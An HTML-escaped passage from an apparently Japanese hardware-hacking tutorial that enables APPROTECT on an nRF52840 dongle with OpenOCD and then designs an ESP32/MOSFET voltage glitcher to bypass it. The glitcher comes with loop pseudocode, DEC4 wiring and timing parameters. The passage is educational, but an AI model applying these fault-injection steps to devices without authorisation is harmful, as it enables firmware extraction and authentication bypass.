&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000040  2f 03 00 00 2f 03 00 00  2f 03 00 00 2f 03 00 00  |/.../.../.../...|
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000080  2f 03 00 00 b9 05 00 00  2f 03 00 00 2f 03 00 00  |/......./.../...|
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000090  2f 03 00 00 2f 03 00 00  2f 03 00 00 2f 03 00 00  |/.../.../.../...|
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;(..snip..)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00001120  9e 46 70 47 68 65 6c 6c  6f 2c 20 77 6f 72 6c 64  |.FpGhello, world|
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;approtectレジスタの確認&#34;&gt;APPROTECTレジスタの確認&lt;/h3&gt;
&lt;p&gt;APPROTECTレジスタは0x10001208に存在します。
データシートには当該アドレスの下位8ビットが0xFFのとき無効、0x00のとき有効と記載があります。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/approtect.png&#34; alt=&#34;APPROTECTのデータシート&#34;&gt;
&lt;/p&gt;
&lt;p&gt;&lt;code&gt;mdw&lt;/code&gt;で確認します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; flash banks
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#0 : nrf52.flash (nrf5) at 0x00000000, size 0x00000000, buswidth 1, chipwidth 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;#1 : nrf52.uicr (nrf5) at 0x10001000, size 0x00000000, buswidth 1, chipwidth 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; mdw 0x10001208 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x10001208: ffffffff
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;値は0xFFであり、無効であることがわかります。&lt;/p&gt;
&lt;h3 id=&#34;approtectの有効化とデバッグの確認&#34;&gt;APPROTECTの有効化とデバッグの確認&lt;/h3&gt;
&lt;p&gt;このアドレスを0x00に設定し有効化します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; halt; flash fillw 0x10001208 0xFFFFFF00 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nRF52840-xxAA(build code: D0) 1024kB Flash, 256kB RAM
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;wrote 4 bytes to 0x10001208 in 0.269560s (0.014 KiB/s)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; mdw 0x10001208 1                         
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x10001208: ffffff00
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ここでresetしてみると・・・&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; reset
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nrf52.cpu -- clearing lockup after double fault
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Failed to enable the FPB
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Polling target nrf52.cpu failed, trying to reexamine
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Could not find MEM-AP to control the core
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;****** WARNING ******
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nRF52 device has AP lock engaged (see UICR APPROTECT register).
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Debug access is denied.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Use &amp;#39;nrf52_recover&amp;#39; to erase and unlock the device.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Examination failed, GDB will be halted. Polling again in 100ms
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; mdw 0x0 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Target not examined yet
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;APPROTECTの影響でデバッグができなくなりました。当然mdwなどでメモリを参照することもできません。この状態ではCPUのデバッグ用アクセスポートである&lt;strong&gt;AHB-AP&lt;/strong&gt;に対するアクセスがすべて禁止されています。ただコントロール用アクセスポートである&lt;strong&gt;CTRL-AP&lt;/strong&gt;はAPPROTECTの影響を受けないため、APPROTECTの状態を示すレジスタ（APPROTECTSTATUS）の参照や、APPROTECTの設定含む全てのフラッシュの初期化を伝えるレジスタ(ERASEALL)への書き込みが可能です。もしCTRL-APまで無効になってしまうと初期化もできなくなりますからね。&lt;/p&gt;
&lt;h3 id=&#34;ctrl-apを用いたデバイス設定の初期化&#34;&gt;CTRL-APを用いたデバイス設定の初期化&lt;/h3&gt;
&lt;p&gt;CTRL-APを操作することで、APPROTECTの初期化を行ってみましょう。&lt;/p&gt;
&lt;h4 id=&#34;approtectstatusレジスタ0xc&#34;&gt;APPROTECTSTATUSレジスタ(0xc)&lt;/h4&gt;
&lt;p&gt;APPROTECTが有効のとき、値は0になっています。これでCTRL-APでもターゲットのプロテクションが有効になっているかどうかがわかります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; nrf52.dap apreg 1 0x0c
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x00000000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h4 id=&#34;eraseallレジスタ0x4&#34;&gt;ERASEALLレジスタ(0x4)&lt;/h4&gt;
&lt;p&gt;Writeオンリーのレジスタです。このレジスタに1を設定することで、APPROTECTの設定を含む全てのフラッシュを消去します。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; nrf52.dap apreg 1 0x4 1 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;この状態で、resetすると・・・&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; reset
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;nrf52.cpu: hardware has 6 breakpoints, 4 watchpoints
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;デバッグ機能が復活しています。mdwを利用したメモリ読み込みもできています。APPROTECTSTATUSレジスタを参照すると、0x1が格納されておりAPPROTECTが無効になっています。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; mdw 0x0 1
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x00000000: ffffffff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; nrf52.dap apreg 1 0x0c
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;0x00000001
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;また改めてフラッシュを確認すると、データが削除されていることがわかります。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-plain&#34; data-lang=&#34;plain&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&amp;gt; halt; dump_image flashdump_after_erase.bin 0x0 0x800000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dumped 8388608 bytes in 142.200241s (57.609 KiB/s)
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;$ hexdump -C flashdump_after_erase.bin |head
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00000000  ff ff ff ff ff ff ff ff  ff ff ff ff ff ff ff ff  |................|
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00100000  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  |................|
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;00800000
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;strong&gt;APPROTECTを無効にするためにはフラッシュを全消去しないといけない&lt;/strong&gt;わけですね。&lt;/p&gt;
&lt;p&gt;プロテクションを有効にした機器では書き込まれているファームウェアでのデバッグができないし、デバッグできないとフラッシュの内容も読み取れない。APPROTECTを無効にするとフラッシュが消えるので初期化してデバッグも意味が無い。というセキュリティ対策になっているとわかります（既に破られているので完全な対策になっていないわけですが）。&lt;/p&gt;
&lt;p&gt;最後に、またフラッシュにサンプルファームウェアを書き込んだうえで、APPROTECTを設定し、プロテクトがかかっている状態にしておきます。&lt;/p&gt;
  &lt;/div&gt;
&lt;/div&gt;
&lt;h1 id=&#34;グリッチャーの設計&#34;&gt;グリッチャーの設計&lt;/h1&gt;
&lt;p&gt;グリッチには、グリッチ用ファームウェアの作成と、グリッチャーとターゲットボード(Dongle)、MOSFETの接続が必要です。&lt;/p&gt;
&lt;p&gt;理想的な電圧グリッチは、特定タイミングで特定の長さをグリッチすることで必ず成功します。しかし現実は甘くありません。成功するタイミングと長さは現実世界の環境や微妙な電圧の揺らぎで変わります。そのため、以下の2つの可変パラメータが必ず存在します。&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;グリッチを開始するタイミング(delay)&lt;/li&gt;
&lt;li&gt;グリッチの長さ(width)&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;オシロスコープで実際に攻撃を行ったときの波形はこちらです。CH1(黄)がMOSFETゲートに流れる電圧、CH2(青)がターゲットのCPU電圧の波形です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/glitch_timing.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;この2つのパラメータをプログラム上で増減させてグリッチを成功させます。難しそうですか？いえいえ、ロジックとしては、以下のようなたった2つのforループなのです。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;target_reset() -&amp;gt; ターゲットのリセット
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;sleep_count() -&amp;gt; 一定時間のスリープ
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;glitch_on() / glitch_off() -&amp;gt; グリッチ操作の開始/終了関数
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;if_glitch_success() -&amp;gt; グリッチ成功の評価関数
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;cm&#34;&gt;*/&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;delay&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;delay_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;delay&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;delay_end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;delay&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;width&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;width_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;width&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;width_end&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;++&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;target_reset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;sleep_count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;delay&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;glitch_on&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;sleep_count&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;width&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;n&#34;&gt;glitch_off&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;is_glitch_success&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()){&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;break&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;  
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;原理としては非常に簡単です。次はコード内で抽象化している各関数の実現方法を説明します。&lt;/p&gt;
&lt;p&gt;今回の電圧グリッチにあてはめて考えると、各関数は以下の機能に対応します。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;関数&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;対応する機能&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;target_reset()&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ターゲットのリセット&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;sleep_count()&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;一定時間のスリープ&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;is_glitch_success()&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;デバッグ可能か&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;&lt;code&gt;glitch_on()/glitch_off()&lt;/code&gt;&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;CPU電圧をGNDに落とす/戻す&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br/&gt;
&lt;h2 id=&#34;ターゲットのリセットの方法&#34;&gt;「ターゲットのリセット」の方法&lt;/h2&gt;
&lt;p&gt;APPROTECTバイパスでは、グリッチのタイミングはパワーオンリセットからの時間という単純なものなので、ここはグリッチャーのGPIOを用いて電源供給の線をオンオフすることで実現可能です。&lt;/p&gt;
&lt;p&gt;別のバイパスではこの機能は複雑なものになる可能性があります。例えば攻撃対象のファームウェアの特定コマンドにパスワード認証があり、電圧グリッチで認証バイパスを試みる場合、「ターゲットのリセット」は、「特定コマンドを送り、パスワードを送信した直後」になります。&lt;/p&gt;
&lt;h2 id=&#34;一定時間のスリープの方法&#34;&gt;「一定時間のスリープ」の方法&lt;/h2&gt;
&lt;p&gt;これは攻撃対象がどれだけシビアかによります。今回の攻撃対象であるnRF52のAPPROTECTバイパスでは、電圧グリッチ時間が7-10us程度で成功することを確認しています。またスリープ精度が1us単位でも十分成功するので、よほど遅いマイコンでない限りは成功します。Arduino-IDEには&lt;code&gt;delayMicroseconds()&lt;/code&gt;が用意されているので、一定時間のスリープはこの関数を利用するだけで実現できます。&lt;/p&gt;
&lt;h2 id=&#34;デバッグ可能か確認する方法&#34;&gt;「デバッグ可能か」確認する方法&lt;/h2&gt;
&lt;p&gt;APPROTECTバイパスが成功するとデバッグが可能になります。よって「デバッグ可能か」が&lt;code&gt;is_glitch_success()&lt;/code&gt;の実装になります。&lt;/p&gt;
&lt;p&gt;nRF52のデバッグポートはSWDです。グリッチャー単体でこれが使えるか確認するということは、グリッチャーでのSWD実装が必要になるわけです。&lt;/p&gt;
&lt;p&gt;ただし今回はモロ参考になるコードがあったので、グリッチャーにSWD実装を含めることにしました。もしグリッチャー作成の負荷を下げたい場合は、PC+J-Link+OpenOCDとオシロスコープのトリガ出力を組み合わせることで同じようにグリッチが可能と思います。&lt;/p&gt;
&lt;p&gt;なお別のバイパスではこの機能は複雑・簡単なものになる可能性があります。例えば攻撃対象のファームウェアの特定コマンドにパスワード認証があり、電圧グリッチで認証バイパスを試みたい場合、「デバッグ可能か」は、「認証なしで特定コマンドが受け入れるか」になります。コマンドのプロトコルによりますが、単純なUARTであればSWD実装より簡単な気がします。&lt;/p&gt;
&lt;h2 id=&#34;cpu電圧をgndに落とす戻す方法&#34;&gt;「CPU電圧をGNDに落とす/戻す」方法&lt;/h2&gt;
&lt;p&gt;参考記事ではnRF52のDEC4を特定タイミングでGNDに接続することで実現しています。次の画像はnRF52840のデータシート上のレギュレータの構成図です。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/reg_dec4_edit.png&#34; alt=&#34;REG_DEC4&#34;&gt;
&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;赤線、MOSFET、GNDの記載は筆者による加筆&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;DEC4の部分がデカップリングコンデンサからの供給線となっています。このデカップリングコンデンサの手前で一瞬GNDに落とす操作ができれば、電圧グリッチ操作ができるということです。私はN-ch MOSFETに以下のように接続することで実現できると考えました。&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th style=&#34;text-align:center&#34;&gt;MOSFET&lt;/th&gt;
&lt;th style=&#34;text-align:center&#34;&gt;接続先&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ゲート&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;グリッチャーのGPIO OUT&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ドレイン&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ターゲットのDEC4&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td style=&#34;text-align:center&#34;&gt;ソース&lt;/td&gt;
&lt;td style=&#34;text-align:center&#34;&gt;GND&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;br/&gt;
&lt;h1 id=&#34;グリッチ回路の作成&#34;&gt;グリッチ回路の作成&lt;/h1&gt;
&lt;h2 id=&#34;前準備dec4への配線&#34;&gt;前準備:DEC4への配線&lt;/h2&gt;
&lt;p&gt;グリッチ回路の前に、DongleのDEC4への配線を済ませておきます。DEC4に繋がるポイントはDongleでC5のシルクが印字されたところです。SMDコンデンサのCPU側に配線が必要です。極小なので、はんだ付けに慣れていない方は頑張ってください。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/nrf52_c5_edit.jpg&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;結線後は次のようになります。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/nrf52_c5_short.jpg&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;p&gt;うまく結線できた場合、電源投入後にテスターで計測すると1.3V程度を指します。&lt;/p&gt;
&lt;p&gt;より詳細を確認するため、電源投入時のDEC4の電圧をオシロスコープで見てみましょう。
DEC4の適当な電圧の立ち上がりをトリガーにして、電源投入時から約2秒後を1us程度のスケールで調査します。そうするとだいたい200mV程度降下しているところがあります。参考記事によって、ここの降下の直前がグリッチのタイミングだとわかっています。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/dec4_down_edit.png&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;h2 id=&#34;グリッチ回路の作成-1&#34;&gt;グリッチ回路の作成&lt;/h2&gt;
&lt;p&gt;これまでの設計をもとに、図のようなグリッチ回路を考えました。&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/glitch_circuit.png&#34; alt=&#34;グリッチ回路&#34;&gt;
&lt;/p&gt;
&lt;p&gt;グリッチャーのGPIOピンは後述するファームウェアに合わせて記載していますが、自由です。回路ではXY-MOSを利用していますが自分でMOSFETを用意してもOKです。
図でわかるようにターゲットの電源(VDD OUT)はESP32のGPIOに任せています。ESP32のGPIOから出力できる電流は1ピンで最大40mAなので、場合によっては動かないかも。ちゃんとやりたい場合は電源回路を用意してVDD OUTに流してください。&lt;/p&gt;
&lt;p&gt;実際に結線した写真は以下です。ぐちゃぐちゃですが、動けばいいです！&lt;/p&gt;
&lt;p&gt;
  &lt;img src=&#34;./img/glitch_breadboard.jpg&#34; alt=&#34;&#34;&gt;
&lt;/p&gt;
&lt;h1 id=&#34;グリッチャーのファームウェア作成&#34;&gt;グリッチャーのファームウェア作成&lt;/h1&gt;
&lt;p&gt;グリッチャーのファームウェア作成が一番面倒なわけですが、作り方を1から説明するのは紙面の都合上厳しいです。そこで私が作成した、コンソール上でタイミングを設定してグリッチ可能なESP32のファームウェアを用意しました。&lt;/p&gt;
